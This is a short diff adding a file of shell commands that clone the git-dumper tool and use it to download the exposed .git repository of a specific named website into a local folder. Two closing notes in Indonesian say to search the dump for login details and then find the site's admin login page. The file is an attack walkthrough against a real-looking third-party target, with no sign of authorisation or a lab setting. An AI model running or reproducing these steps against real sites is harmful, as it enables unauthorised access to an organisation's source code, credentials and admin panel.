@@ -1,0 +1,10 @@
+mkdir master 
+git clone https://github.com/arthaud/git-dumper.git
+ls
+cd git-dumper
+mkdir haha 
+python3 git_dumper.py https://www.ykb-wasiat.org/.git/ haha 
+cd haha
+ls
+cari untuk login 
+setelah itu cari halaman login adminnya 
